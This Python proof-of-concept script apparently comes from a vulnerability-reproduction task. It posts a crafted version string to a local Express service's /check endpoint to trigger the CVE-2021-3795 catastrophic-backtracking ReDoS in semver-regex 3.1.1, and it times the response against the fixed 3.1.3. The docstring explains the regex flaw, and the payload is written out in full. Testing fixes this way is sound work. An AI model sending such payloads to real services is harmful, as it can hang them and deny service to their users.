#!/usr/bin/env python3
"""[GIVEN] original_poc — CVE-2021-3795 seed exploit, delivered over EXTERNAL HTTP.

Sends the CVE-2021-3795 catastrophic-backtracking version string to the REAL Express service
(POST /check) and measures the server-side response latency. The payload is a dotted run of
ambiguous pre-release identifiers whose trailing '!' fails semver-regex@3.1.1's `(?=$|\\s)`
lookahead, forcing exponential backtracking on the unbounded greedy pre-release group.

Expected: SLOW (response hangs -> HTTP timeout) on V0 (3.1.1); FAST/bounded on V1 (3.1.3), because
CVE-2021-3795's fix lazifies the identifiers, bounds them with {0,100}, and swaps the lookahead for \\b.

Usage: original_poc.py http://127.0.0.1:28131
"""
import http.client
import json
import socket
import sys
import time

PAYLOAD = "1.2.3-" + "a-a." * 22 + "!"   # len 95
HTTP_TIMEOUT_S = 10.0


def run(base_url: str) -> dict:
    host, port = base_url.replace("http://", "").split(":")
    body = json.dumps({"version": PAYLOAD})
    t0 = time.perf_counter()
    try:
        c = http.client.HTTPConnection(host, int(port), timeout=HTTP_TIMEOUT_S)
        c.request("POST", "/check", body=body,
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        resp = r.read().decode("utf-8", "replace")
        c.close()
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": False, "resp": resp[:200]}
    except (socket.timeout, TimeoutError):
        ms = (time.perf_counter() - t0) * 1000.0
        return {"latency_ms": round(ms, 1), "timeout": True, "resp": None}


if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:28131"
    out = run(base)
    print(json.dumps({"poc": "original/CVE-2021-3795", "payload_len": len(PAYLOAD),
                      "target": base, **out}, indent=2))
